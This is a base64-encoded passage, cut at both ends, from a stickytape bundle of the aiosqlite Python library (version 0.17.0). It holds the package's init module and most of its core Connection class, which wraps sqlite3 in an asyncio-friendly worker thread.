tzOiB7ZX0nKVxyXG4gICAgICAgICAgICAgICAgIikKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb3NxbGl0ZS9fX2luaXRfXy5weScsIGInIyBDb3B5cmlnaHQgMjAxOCBKb2huIFJlZXNlXG4jIExpY2Vuc2VkIHVuZGVyIHRoZSBNSVQgbGljZW5zZVxuXG4iIiJhc3luY2lvIGJyaWRnZSB0byB0aGUgc3RhbmRhcmQgc3FsaXRlMyBtb2R1bGUiIiJcblxuZnJvbSBzcWxpdGUzIGltcG9ydCAoICAjIHB5bGludDogZGlzYWJsZT1yZWRlZmluZWQtYnVpbHRpblxuICAgIERhdGFiYXNlRXJyb3IsXG4gICAgRXJyb3IsXG4gICAgSW50ZWdyaXR5RXJyb3IsXG4gICAgTm90U3VwcG9ydGVkRXJyb3IsXG4gICAgT3BlcmF0aW9uYWxFcnJvcixcbiAgICBQcm9ncmFtbWluZ0Vycm9yLFxuICAgIFJvdyxcbiAgICBXYXJuaW5nLFxuICAgIHJlZ2lzdGVyX2FkYXB0ZXIsXG4gICAgcmVnaXN0ZXJfY29udmVydGVyLFxuICAgIHNxbGl0ZV92ZXJzaW9uLFxuICAgIHNxbGl0ZV92ZXJzaW9uX2luZm8sXG4pXG5cbl9fYXV0aG9yX18gPSAiSm9obiBSZWVzZSJcbmZyb20gLl9fdmVyc2lvbl9fIGltcG9ydCBfX3ZlcnNpb25fX1xuZnJvbSAuY29yZSBpbXBvcnQgQ29ubmVjdGlvbiwgQ3Vyc29yLCBjb25uZWN0XG5cbl9fYWxsX18gPSBbXG4gICAgIl9fdmVyc2lvbl9fIixcbiAgICAicmVnaXN0ZXJfYWRhcHRlciIsXG4gICAgInJlZ2lzdGVyX2NvbnZlcnRlciIsXG4gICAgInNxbGl0ZV92ZXJzaW9uIixcbiAgICAic3FsaXRlX3ZlcnNpb25faW5mbyIsXG4gICAgImNvbm5lY3QiLFxuICAgICJDb25uZWN0aW9uIixcbiAgICAiQ3Vyc29yIixcbiAgICAiUm93IixcbiAgICAiV2FybmluZyIsXG4gICAgIkVycm9yIixcbiAgICAiRGF0YWJhc2VFcnJvciIsXG4gICAgIkludGVncml0eUVycm9yIixcbiAgICAiUHJvZ3JhbW1pbmdFcnJvciIsXG4gICAgIk9wZXJhdGlvbmFsRXJyb3IiLFxuICAgICJOb3RTdXBwb3J0ZWRFcnJvciIsXG5dXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvc3FsaXRlL19fdmVyc2lvbl9fLnB5JywgYidfX3ZlcnNpb25fXyA9ICIwLjE3LjAiXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvc3FsaXRlL2NvcmUucHknLCBiJyMgQ29weXJpZ2h0IDIwMTggSm9obiBSZWVzZVxuIyBMaWNlbnNlZCB1bmRlciB0aGUgTUlUIGxpY2Vuc2VcblxuIiIiXG5Db3JlIGltcGxlbWVudGF0aW9uIG9mIGFpb3NxbGl0ZSBwcm94aWVzXG4iIiJcblxuaW1wb3J0IGFzeW5jaW9cbmltcG9ydCBsb2dnaW5nXG5pbXBvcnQgc3FsaXRlM1xuaW1wb3J0IHN5c1xuaW1wb3J0IHdhcm5pbmdzXG5mcm9tIGZ1bmN0b29scyBpbXBvcnQgcGFydGlhbFxuZnJvbSBwYXRobGliIGltcG9ydCBQYXRoXG5mcm9tIHF1ZXVlIGltcG9ydCBFbXB0eSwgUXVldWVcbmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWRcbmZyb20gdHlwaW5nIGltcG9ydCAoXG4gICAgQW55LFxuICAgIEFzeW5jSXRlcmF0b3IsXG4gICAgQ2FsbGFibGUsXG4gICAgR2VuZXJhdG9yLFxuICAgIEl0ZXJhYmxlLFxuICAgIE9wdGlvbmFsLFxuICAgIFR5cGUsXG4gICAgVW5pb24sXG4pXG5mcm9tIHdhcm5pbmdzIGltcG9ydCB3YXJuXG5cbmZyb20gLmNvbnRleHQgaW1wb3J0IGNvbnRleHRtYW5hZ2VyXG5mcm9tIC5jdXJzb3IgaW1wb3J0IEN1cnNvclxuXG5fX2FsbF9fID0gWyJjb25uZWN0IiwgIkNvbm5lY3Rpb24iLCAiQ3Vyc29yIl1cblxuTE9HID0gbG9nZ2luZy5nZXRMb2dnZXIoImFpb3NxbGl0ZSIpXG5cblxuZGVmIGdldF9sb29wKGZ1dHVyZTogYXN5bmNpby5GdXR1cmUpIC0+IGFzeW5jaW8uQWJzdHJhY3RFdmVudExvb3A6XG4gICAgaWYgc3lzLnZlcnNpb25faW5mbyA+PSAoMywgNyk6XG4gICAgICAgIHJldHVybiBmdXR1cmUuZ2V0X2xvb3AoKVxuICAgIGVsc2U6XG4gICAgICAgIHJldHVybiBmdXR1cmUuX2xvb3BcblxuXG5jbGFzcyBDb25uZWN0aW9uKFRocmVhZCk6XG4gICAgZGVmIF9faW5pdF9fKFxuICAgICAgICBzZWxmLFxuICAgICAgICBjb25uZWN0b3I6IENhbGxhYmxlW1tdLCBzcWxpdGUzLkNvbm5lY3Rpb25dLFxuICAgICAgICBpdGVyX2NodW5rX3NpemU6IGludCxcbiAgICAgICAgbG9vcDogT3B0aW9uYWxbYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcF0gPSBOb25lLFxuICAgICkgLT4gTm9uZTpcbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXygpXG4gICAgICAgIHNlbGYuX3J1bm5pbmcgPSBUcnVlXG4gICAgICAgIHNlbGYuX2Nvbm5lY3Rpb246IE9wdGlvbmFsW3NxbGl0ZTMuQ29ubmVjdGlvbl0gPSBOb25lXG4gICAgICAgIHNlbGYuX2Nvbm5lY3RvciA9IGNvbm5lY3RvclxuICAgICAgICBzZWxmLl90eDogUXVldWUgPSBRdWV1ZSgpXG4gICAgICAgIHNlbGYuX2l0ZXJfY2h1bmtfc2l6ZSA9IGl0ZXJfY2h1bmtfc2l6ZVxuXG4gICAgICAgIGlmIGxvb3AgaXMgbm90IE5vbmU6XG4gICAgICAgICAgICB3YXJuKFxuICAgICAgICAgICAgICAgICJhaW9zcWxpdGUuQ29ubmVjdGlvbiBubyBsb25nZXIgdXNlcyB0aGUgYGxvb3BgIHBhcmFtZXRlciIsXG4gICAgICAgICAgICAgICAgRGVwcmVjYXRpb25XYXJuaW5nLFxuICAgICAgICAgICAgKVxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIF9jb25uKHNlbGYpIC0+IHNxbGl0ZTMuQ29ubmVjdGlvbjpcbiAgICAgICAgaWYgc2VsZi5fY29ubmVjdGlvbiBpcyBOb25lOlxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigibm8gYWN0aXZlIGNvbm5lY3Rpb24iKVxuXG4gICAgICAgIHJldHVybiBzZWxmLl9jb25uZWN0aW9uXG5cbiAgICBkZWYgX2V4ZWN1dGVfaW5zZXJ0KFxuICAgICAgICBzZWxmLCBzcWw6IHN0ciwgcGFyYW1ldGVyczogSXRlcmFibGVbQW55XVxuICAgICkgLT4gT3B0aW9uYWxbc3FsaXRlMy5Sb3ddOlxuICAgICAgICBjdXJzb3IgPSBzZWxmLl9jb25uLmV4ZWN1dGUoc3FsLCBwYXJhbWV0ZXJzKVxuICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGxhc3RfaW5zZXJ0X3Jvd2lkKCkiKVxuICAgICAgICByZXR1cm4gY3Vyc29yLmZldGNob25lKClcblxuICAgIGRlZiBfZXhlY3V0ZV9mZXRjaGFsbChcbiAgICAgICAgc2VsZiwgc3FsOiBzdHIsIHBhcmFtZXRlcnM6IEl0ZXJhYmxlW0FueV1cbiAgICApIC0+IEl0ZXJhYmxlW3NxbGl0ZTMuUm93XTpcbiAgICAgICAgY3Vyc29yID0gc2VsZi5fY29ubi5leGVjdXRlKHNxbCwgcGFyYW1ldGVycylcbiAgICAgICAgcmV0dXJuIGN1cnNvci5mZXRjaGFsbCgpXG5cbiAgICBkZWYgcnVuKHNlbGYpIC0+IE5vbmU6XG4gICAgICAgICIiIlxuICAgICAgICBFeGVjdXRlIGZ1bmN0aW9uIGNhbGxzIG9uIGEgc2VwYXJhdGUgdGhyZWFkLlxuXG4gICAgICAgIDptZXRhIHByaXZhdGU6XG4gICAgICAgICIiIlxuICAgICAgICB3aGlsZSBUcnVlOlxuICAgICAgICAgICAgIyBDb250aW51ZXMgcnVubmluZyB1bnRpbCBhbGwgcXVldWUgaXRlbXMgYXJlIHByb2Nlc3NlZCxcbiAgICAgICAgICAgICMgZXZlbiBhZnRlciBjb25uZWN0aW9uIGlzIGNsb3NlZCAoc28gd2UgY2FuIGZpbmFsaXplIGFsbFxuICAgICAgICAgICAgIyBmdXR1cmVzKVxuICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgIGZ1dHVyZSwgZnVuY3Rpb24gPSBzZWxmLl90eC5nZXQodGltZW91dD0wLjEpXG4gICAgICAgICAgICBleGNlcHQgRW1wdHk6XG4gICAgICAgICAgICAgICAgaWYgc2VsZi5fcnVubmluZzpcbiAgICAgICAgICAgICAgICAgICAgY29udGludWVcbiAgICAgICAgICAgICAgICBicmVha1xuICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgIExPRy5kZWJ1ZygiZXhlY3V0aW5nICVzIiwgZnVuY3Rpb24pXG4gICAgICAgICAgICAgICAgcmVzdWx0ID0gZnVuY3Rpb24oKVxuICAgICAgICAgICAgICAgIExPRy5kZWJ1Zygib3BlcmF0aW9uICVzIGNvbXBsZXRlZCIsIGZ1bmN0aW9uKVxuXG4gICAgICAgICAgICAgICAgZGVmIHNldF9yZXN1bHQoZnV0LCByZXN1bHQpOlxuICAgICAgICAgICAgICAgICAgICBpZiBub3QgZnV0LmRvbmUoKTpcbiAgICAgICAgICAgICAgICAgICAgICAgIGZ1dC5zZXRfcmVzdWx0KHJlc3VsdClcblxuICAgICAgICAgICAgICAgIGdldF9sb29wKGZ1dHVyZSkuY2FsbF9zb29uX3RocmVhZHNhZmUoc2V0X3Jlc3VsdCwgZnV0dXJlLCByZXN1bHQpXG4gICAgICAgICAgICBleGNlcHQgQmFzZUV4Y2VwdGlvbiBhcyBlOlxuICAgICAgICAgICAgICAgIExPRy5kZWJ1ZygicmV0dXJuaW5nIGV4Y2VwdGlvbiAlcyIsIGUpXG5cbiAgICAgICAgICAgICAgICBkZWYgc2V0X2V4Y2VwdGlvbihmdXQsIGUpOlxuICAgICAgICAgICAgICAgICAgICBpZiBub3QgZnV0LmRvbmUoKTpcbiAgICAgICAgICAgICAgICAgICAgICAgIGZ1dC5zZXRfZXhjZXB0aW9uKGUpXG5cbiAgICAgICAgICAgICAgICBnZXRfbG9vcChmdXR1cmUpLmNhbGxfc29vbl90aHJlYWRzYWZlKHNldF9leGNlcHRpb24sIGZ1dHVyZSwgZSlcblxuICAgIGFzeW5jIGRlZiBfZXhlY3V0ZShzZWxmLCBmbiwgKmFyZ3MsICoqa3dhcmdzKTpcbiAgICAgICAgIiIiUXVldWUgYSBmdW5jdGlvbiB3aXRoIHRoZSBnaXZlbiBhcmd1bWVudHMgZm9yIGV4ZWN1dGlvbi4iIiJcbiAgICAgICAgaWYgbm90IHNlbGYuX3J1bm5pbmcgb3Igbm90IHNlbGYuX2Nvbm5lY3Rpb246XG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJDb25uZWN0aW9uIGNsb3NlZCIpXG5cbiAgICAgICAgZnVuY3Rpb24gPSBwYXJ0aWFsKGZuLCAqYXJncywgKiprd2FyZ3MpXG4gICAgICAgIGZ1dHVyZSA9IGFzeW5jaW8uZ2V0X2V2ZW50X2xvb3AoKS5jcmVhdGVfZnV0dXJlKClcblxuICAgICAgICBzZWxmLl90eC5wdXRfbm93YWl0KChmdXR1cmUsIGZ1bmN0aW9uKSlcblxuICAgICAgICByZXR1cm4gYXdhaXQgZnV0dXJlXG5cbiAgICBhc3luYyBkZWYgX2Nvbm5lY3Qoc2VsZikgLT4gIkNvbm5lY3Rpb24iOlxuICAgICAgICAiIiJDb25uZWN0IHRvIHRoZSBhY3R1YWwgc3FsaXRlIGRhdGFiYXNlLiIiIlxuICAgICAgICBpZiBzZWxmLl9jb25uZWN0aW9uIGlzIE5vbmU6XG4gICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgZnV0dXJlID0gYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpLmNyZWF0ZV9mdXR1cmUoKVxuICAgICAgICAgICAgICAgIHNlbGYuX3R4LnB1dF9ub3dhaXQoKGZ1dHVyZSwgc2VsZi5fY29ubmVjdG9yKSlcbiAgICAgICAgICAgICAgICBzZWxmLl9jb25uZWN0aW9uID0gYXdhaXQgZnV0dXJlXG4gICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOlxuICAgICAgICAgICAgICAgIHNlbGYuX3J1bm5pbmcgPSBGYWxzZVxuICAgICAgICAgICAgICAgIHNlbGYuX2Nvbm5lY3Rpb24gPSBOb25lXG4gICAgICAgICAgICAgICAgcmFpc2VcblxuICAgICAgICByZXR1cm4gc2VsZlxuXG4gICAgZGVmIF9fYXdhaXRfXyhzZWxmKSAtPiBHZW5lcmF0b3JbQW55LCBOb25lLCAiQ29ubmVjdGlvbiJdOlxuICAgICAgICBzZWxmLnN0YXJ0KClcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Nvbm5lY3QoKS5fX2F3YWl0X18oKVxuXG4gICAgYXN5bmMgZGVmIF9fYWVudGVyX18oc2VsZikgLT4gIkNvbm5lY3Rpb24iOlxuICAgICAgICByZXR1cm4gYXdhaXQgc2VsZlxuXG4gICAgYXN5bmMgZGVmIF9fYWV4aXRfXyhzZWxmLCBleGNfdHlwZSwgZXhjX3ZhbCwgZXhjX3RiKSAtPiBOb25lOlxuICAgICAgICBhd2FpdCBzZWxmLmNsb3NlKClcblxuICAgIEBjb250ZXh0bWFuYWdlclxuICAgIGFzeW5jIGRlZiBjdXJzb3Ioc2VsZikgLT4gQ3Vyc29yOlxuICAgICAgICAiIiJDcmVhdGUgYW4gYWlvc3FsaXRlIGN1cnNvciB3cmFwcGluZyBhIHNxbGl0ZTMgY3Vyc29yIG9iamVjdC4iIiJcbiAgICAgICAgcmV0dXJuIEN1cnNvcihzZWxmLCBhd2FpdCBzZWxmLl9leGVjdXRlKHNlbGYuX2Nvbm4uY3Vyc29yKSlcblxuICAgIGFzeW5jIGRlZiBjb21taXQoc2VsZikgLT4gTm9uZTpcbiAgICAgICAgIiIiQ29tbWl0IHRoZSBjdXJyZW50IHRyYW5zYWN0aW9uLiIiIlxuICAgICAgICBhd2FpdCBzZWxmLl9leGVjdXRlKHNlbGYuX2Nvbm4uY29tbWl0KVxuXG4gICAgYXN5bmMgZGVmIHJvbGxiYWNrKHNlbGYpIC0+IE5vbmU6XG4gICAgICAgICIiIlJvbGwgYmFjayB0aGUgY3VycmVudCB0cmFuc2FjdGlvbi4iIiJcbiAgICAgICAgYXdhaXQgc2VsZi5fZXhlY3V0ZShzZWxmLl9jb25uLnJvbGxiYWNrKVxuXG4gICAgYXN5bmMgZGVmIGNsb3NlKHNlbGYpIC0+IE5vbmU6XG4gICAgICAgICIiIkNvbXBsZXRlIHF1ZXVlZCBxdWVyaWVzL2N1cnNvcnMgYW5kIGNsb3NlIHRoZSBjb25uZWN0aW9uLiIiIlxuICAgICAgICB0cnk6XG4gICAgICAgICAgICBhd2FpdCBzZWxmLl9leGVjdXRlKHNlbGYuX2Nvbm4uY2xvc2UpXG4gICAgICAgIGV4Y2VwdCBFeGNlcHRpb246XG4gICAgICAgICAgICBMT0cuaW5mbygiZXhjZXB0aW9uIG9jY3VycmVkIHdoaWxlIGNsb3NpbmcgY29ubmVjdGlvbiIpXG4gICAgICAgICAgICByYWlzZVxuICAgICAgICBmaW5hbGx5OlxuICAgICAgICAgICAgc2VsZi5fcnVubmluZyA9IEZhbHNlXG4gICAgICAgICAgICBzZWxmLl9jb25uZWN0aW9uID0gTm9uZVxuXG4gICAgQGNvbnRleHRtYW5hZ2VyXG4gICAgYXN5bmMgZGVmIGV4ZWN1dGUoc2VsZiwgc3FsOiBzdHIsIHBhcmFtZXRlcnM6IEl0ZXJhYmxlW0FueV0gPSBOb25lKSAtPiBDdXJzb3I6XG4gICAgICAgICIiIkhlbHBlciB0byBjcmVhdGUgYSBjdXJzb3IgYW5kIGV4ZWN1dGUgdGhlIGdpdmVuIHF1ZXJ5LiIiIlxuICAgICAgICBpZiBwYXJhbWV0ZXJzIGlzIE5vbmU6XG4gICAgICAgICAgICBwYXJhbWV0ZXJzID0gW11cbiAgICAgICAgY3Vyc29yID0gYXdhaXQgc2VsZi5fZXhlY3V0ZShzZWxmLl9jb25uLmV4ZWN1dGUsIHNxbCwgcGFyYW1ldGVycylcbiAgICAgICAgcmV0dXJuIEN1cnNvcihzZWxmLCBjdXJzb3IpXG5cbiAgICBAY29udGV4dG1hbmFnZXJcbiAgICBhc3luYyBkZWYgZXhlY3V0ZV9pbnNlcnQoXG4gICAgICAgIHNlbGYsIHNxbDogc3RyLCBwYXJhbWV0ZXJzOiBJdGVyYWJsZVtBbnldID0gTm9uZVxuICAgICkgLT4gT3B0aW9uYWxbc3FsaXRlMy5Sb3ddOlxuICAgICAgICAiIiJIZWxwZXIgdG8gaW5zZXJ0IGFuZCBnZXQgdGhlIGxhc3RfaW5zZXJ0X3Jvd2lkLiIiIlxuICAgICAgICBpZiBwYXJhbWV0ZXJzIGlzIE5vbmU6XG4gICAgICAgICAgICBwYXJhbWV0ZXJzID0gW11cbiAgICAgICAgcmV0dXJuIGF3YWl0IHNlbGYuX2V4ZWN1dGUoc2VsZi5fZXhlY3V0ZV9pbnNlcnQsIHNxbCwgcGFyYW1ldGVycylcblxuICAgIEBjb250ZXh0bWFuYWdlclxuICAgIGFzeW5jIGRlZiBleGVjdXRlX2ZldGNoYWxsKFxuICAgICAgICBzZWxmLCBzcWw6IHN0ciwgcGFyYW1ldGVyczogSXRlcmFibGVbQW55XSA9IE5vbmVcbiAgICApIC0+IEl0ZXJhYmxlW3NxbGl0ZTMuUm93XTpcbiAgICAgICAgIiIiSGVscGVyIHRvIGV4ZWN1dGUgYSBxdWVyeSBhbmQgcmV0dXJuIGFsbCB0aGUgZGF0YS4iIiJcbiAgICAgICAgaWYgcGFyYW1ldGVycyBpcyBOb25lOlxuICAgICAgICAgICAgcGFyYW1ldGVycyA9IFtdXG4gICAgICAgIHJldHVybiBhd2FpdCBzZWxmLl9leGVjdXRlKHNlbGYuX2V4ZWN1dGVfZmV0Y2hhbGwsIHNxbCwgcGFyYW1ldGVycylcblxuICAgIEBjb250ZXh0bWFuYWdlclxuICAgIGFzeW5jIGRlZiBleGVjdXRlbWFueShcbiAgICAgICAgc2VsZiwgc3FsOiBzdHIsIHBhcmFtZXRlcnM6IEl0ZXJhYmxlW0l0ZXJhYmxlW0FueV1dXG4gICAgKSAtPiBDdXJzb3I6XG4gICAgICAgICIiIkhlbHBlciB0byBjcmVhdGUgYSBjdXJzb3IgYW5kIGV4ZWN1dGUgdGhlIGdpdmVuIG11bHRpcXVlcnkuIiIiXG4gICAgICAgIGN1cnNvciA9IGF3YWl0IHNlbGYuX2V4ZWN1dGUoc2VsZi5fY29ubi5leGVjdXRlbWFueSwgc3FsLCBwYXJhbWV0ZXJzKVxuICAgICAgICByZXR1cm4gQ3Vyc29yKHNlbGYsIGN1cnNvcilcblxuICAgIEBjb250ZXh0bWFuYWdlclxuICAgIGFzeW5jIGRlZiBleGVjdXRlc2NyaXB0KHNlbGYsIHNxbF9zY3JpcHQ6IHN0cikgLT4gQ3Vyc29yOlxuICAgICAgICAiIiJIZWxwZXIgdG8gY3JlYXRlIGEgY3Vyc29yIGFuZCBleGVjdXRlIGEgdXNlciBzY3JpcHQuIiIiXG4gICAgICAgIGN1cnNvciA9IGF3YWl0IHNlbGYuX2V4ZWN1dGUoc2VsZi5fY29ubi5leGVjdXRlc2NyaXB0LCBzcWxfc2NyaXB0KVxuICAgICAgICByZXR1cm4gQ3Vyc29yKHNlbGYsIGN1cnNvcilcblxuICAgIGFzeW5jIGRlZiBpbnRlcnJ1cHQoc2VsZikgLT4gTm9uZTpcbiAgICAgICAgIiIiSW50ZXJydXB0IHBlbmRpbmcgcXVlcmllcy4iIiJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Nvbm4uaW50ZXJydXB0KClcblxuICAgIGFzeW5jIGRlZiBjcmVhdGVfZnVuY3Rpb24oXG4gICAgICAgIHNlbGYsIG5hbWU6IHN0ciwgbnVtX3BhcmFtczogaW50LCBmdW5jOiBDYWxsYWJsZSwgZGV0ZXJtaW5pc3RpYzogYm9vbCA9IEZhbHNlXG4gICAgKSAtPiBOb25lOlxuICAgICAgICAiIiJcbiAgICAgICAgQ3JlYXRlIHVzZXItZGVmaW5lZCBmdW5jdGlvbiB0aGF0IGNhbiBiZSBsYXRlciB1c2VkXG4gICAgICAgIHdpdGhpbiBTUUwgc3RhdGVtZW50cy4gTXVzdCBiZSBydW4gd2l0aGluIHRoZSBzYW1lIHRocmVhZFxuICAgICAgICB0aGF0IHF1ZXJ5IGV4ZWN1dGlvbnMgdGFrZSBwbGFjZSBzbyBpbnN0ZWFkIG9mIGV4ZWN1dGluZyBkaXJlY3RseVxuICAgICAgICBhZ2FpbnN0IHRoZSBjb25uZWN0aW9uLCB3ZSBkZWZlciB0aGlzIHRvIGBydW5gIGZ1bmN0aW9uLlxuXG4gICAgICAgIEluIFB5dGhvbiAzLjggYW5kIGFib3ZlLCBpZiAqZGV0ZXJtaW5pc3RpYyogaXMgdHJ1ZSwgdGhlIGNyZWF0ZWRcbiAgICAgICAgZnVuY3Rpb24gaXMgbWFya2VkIGFzIGRldGVybWluaXN0aWMsIHdoaWNoIGFsbG93cyBTUUxpdGUgdG8gcGVyZm9ybVxuICAgICAgICBhZGRpdGlvbmFsIG9wdGltaXphdGlvbnMuIFRoaXMgZmxhZyBpcyBzdXBwb3J0ZWQgYnkgU1FMaXRlIDMuOC4zIG9yXG4gICAgICAgIGhpZ2hlciwgYGBOb3RTdXBwb3J0ZWRFcnJvcmBgIHdpbGwgYmUgcmFpc2VkIGlmIHVzZWQgd2l0aCBvbGRlclxuICAgICAgICB2ZXJzaW9ucy5cbiAgICAgICAgIiIiXG4gICAgICAgIGlmIHN5cy52ZXJzaW9uX2luZm8gPj0gKDMsIDgpOlxuICAgICAgICAgICAgYXdhaXQgc2VsZi5fZXhlY3V0ZShcbiAgICAgICAgICAgICAgICBzZWxmLl9jb25uLmNyZWF0ZV9mdW5jdGlvbixcbiAgICAgICAgICAgICAgICBuYW1lLFxuICAgICAgICAgICAgICAgIG51bV9wYXJhbXMsXG4gICAgICAgICAgICAgICAgZnVuYyxcbiAgICAgICAgICAgICAgICBkZXRlcm1pbmlzdGljPWRldGVybWluaXN0aWMsXG4gICAgICAgICAgICApXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICBpZiBkZXRlcm1pbmlzdGljOlxuICAgICAgICAgICAgICAgIHdhcm5pbmdzLndhcm4oXG4gICAgICAgICAgICAgICAgICAgICJEZXRlcm1pbmlzdGljIGZ1bmN0aW9uIHN1cHBvcnQgaXMgb25seSBhdmFpbGFibGUgb24gIlxuICAgICAgICAgICAgICAgICAgICBcJ1B5dGhvbiAzLjgrLiBGdW5jdGlvbiAie30iIHdpbGwgYmUgcmVnaXN0ZXJlZCBhcyBcJ1xuICAgICAgICAgICAgICAgICAgICAibm9uLWRldGVybWluaXN0aWMgYXMgcGVyIFNRTGl0ZSBkZWZhdWx0cy4iLmZvcm1hdChuYW1lKVxuICAgICAgICAgICAgICAgIClcblxuICAgICAgICAgICAgYXdhaXQgc2VsZi5fZXhlY3V0ZShzZWxmLl9jb25uLmNyZWF0ZV9mdW5jdGlvbiwgbmFtZSwgbnVtX3BhcmFtcywgZnVuYylcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiBpbl90cmFuc2FjdGlvbihzZWxmKSAtPiBib29sOlxuICAgICAgICByZXR1cm4gc2VsZi5fY29ubi5pbl90cmFuc2FjdGlvblxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIGlzb2xhdGlvbl9sZXZlbChzZWxmKSAtPiBzdHI6XG4gICAgICAgIHJldHVybiBzZWxmLl9jb25uLmlzb2xhdGlvbl9sZXZlbFxuXG4gICAgQGlzb2xhdGlvbl9sZXZlbC5zZXR0ZXJcbiAgICBkZWYgaXNvbGF0aW9uX2xldmVsKHNlbGYsIHZhbHVlOiBzdHIpIC0+IE5vbmU6XG4gICAgICAgIHNlbGYuX2Nvbm4uaXNvbGF0aW9uX2xldmVsID0gdmFsdWVcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiByb3dfZmFjdG9yeShzZWxmKSAtPiAiT3B0aW9uYWxbVHlwZV0iOiAgIyBweTMuNS4yIGNvbXBhdCAoIzI0KVxuICAgICAgICByZXR1cm4gc2VsZi5fY29ubi5yb3dfZmFjdG9yeVxuXG4gICAgQHJvd19mYWN0b3J5LnNldHRlclxuICAgIGRlZiByb3dfZmFjdG9yeShzZWxmLCBmYWN0b3J5OiAiT3B0aW9uYWxbVHlwZV0iKSAtPiBOb25lOiAgIyBweTMuNS4yIGNvbXBhdCAoIzI0KVxuICAgICAgICBzZWxmLl9jb25uLnJvd19mYWN0b3J5ID0gZmFjdG9yeVxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIHRleHRfZmFjdG9yeShzZWxmKSAtPiBUeXBlOlxuICAgICAgICByZXR1cm4gc2VsZi5fY29ubi50ZXh0X2ZhY3RvcnlcblxuICAgIEB0ZXh0X2ZhY3Rvcnkuc2V0dGVyXG4gICAgZGVmIHRleHRfZmFjdG9yeShzZWxmLCBmYWN0b3J5OiBUeXBlKSAtPiBOb25lOlxuICAgICAgICBzZWxmLl9jb25uLnRleHRfZmFjdG9yeSA9IGZhY3RvcnlcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiB0b3RhbF9jaGFuZ2VzKHNlbGYpIC0+IGludDpcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Nvbm4udG90YWxfY2hhbmdlc1xuXG4gICAgYXN5bmMgZGVmIGVuYWJsZV9sb2FkX2V4dGVuc2lvbihzZWxmLCB2YWx1ZTogYm9vbCkgLT4gTm9uZTpcbiAgICAgICAgYXdhaXQgc2VsZi5fZXhlY3V0ZShzZWxmLl9jb25uLmVuYWJsZV9sb2FkX2V4dGVuc2lvbiwgdmFsdWUpICAjIHR5cGU6IGlnbm9yZVxuXG4gICAgYXN5bmMgZGVmIGxvYWRfZXh0ZW5zaW9uKHNlbGYsIHBhdGg6IHN0cik6XG4gICAgICAgIGF3YWl0IHNlbGYuX2V4ZWN1dGUoc2VsZi5fY29ubi5sb2FkX2V4dGVuc2lvbiwgcGF0aCkgICMgdHlwZTogaWdub3JlXG5cbiAgICBhc3luYyBkZWYgc2V0X3Byb2dyZXNzX2hhbmRsZXIoXG4gICAgICAgIHNlbGYsIGhhbmRsZXI6IENhbGxhYmxlW1tdLCBPcHRpb25hbFtpbnRdXSwgbjogaW50XG4gICAgKSAtPiBOb25lOlxuICAgICAgICBhd2FpdCBzZWxmLl9leGVjdXRlKHNlbGYuX2Nvbm4uc2V0X3Byb2dyZXNzX2hhbmRsZXIsIGhhbmRsZXIsIG4pXG5cbiAgICBhc3luYyBkZWYgc2V0X3RyYWNlX2NhbGxiYWNrKHNlbGYsIGhhbmRsZXI6IENhbGxhYmxlKSAtPiBOb25lOlxuICAgICAgICBhd2FpdCBzZWxmLl9leGVjdXRlKHNlbGYuX2Nvbm4uc2V0X3RyYWNlX2NhbGxiYWNrLCBoYW5kbGVyKVxuXG4gICAgYXN5bmMgZGVmIGl0ZXJkdW1wKHNlbGYpIC0+IEFzeW5jSXRlcmF0b3Jbc3RyXTpcbiAgICAgICAgIiIiXG4gICAgICAgIFJldHVybiBhbiBhc3luYyBpdGVyYXRvciB0byBkdW1wIHRoZSBkYXRhYmFzZSBpbiBTUUwgdGV4dCBmb3JtYXQuXG5cbiAgICAgICAgRXhhbXBsZTo6XG5cbiAgICAgICAgICAgIGFzeW5jIGZvciBsaW5lIGluIGRiLml0ZXJkdW1wKCk6XG4gICAgICAgICAgICAgICAgLi4uXG5cbiAgICAgICAgIiIiXG4gICAgICAgIGR1bXBfcXVldWU6IFF1ZXVlID0gUXVldWUoKVxuXG4gICAgICAgIGRlZiBkdW1wZXIoKTpcbiAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBzZWxmLl9jb25uLml0ZXJkdW1wKCk6XG4gICAgICAgICAgICAgICAgICAgIGR1bXBfcXVldWUucHV0X25vd2FpdChsaW5lKVxuICAgICAgICAgICAgICAgIGR1bXBfcXVldWUucHV0X25vd2FpdChOb25lKVxuXG4gICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOlxuICAgICAgICAgICAgICAgIExPRy5leGNlcHRpb24oImV4Y2VwdGlvbiB3aGlsZSBkdW1waW5nIGRiIilcbiAgICAgICAgICAgICAgICBkdW1wX3F1ZXVlLnB1dF9ub3dhaXQoTm9uZSlcbiAgICAgICAgICAgICAgICByYWlzZVxuXG4gICAgICAgIGZ1dCA9IHNlbGYuX2V4ZWN1dGUoZHVtcGVyKVxuICAgICAgICB0YXNrID0gYXN5bmNpby5lbnN1cmVfZnV0dXJlKGZ1dClcblxuICAgICAgICB3aGlsZSBUcnVlOlxuICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgIGxpbmU6IE9wdGlvbmFsW3N0cl0gPSBkdW1wX3F1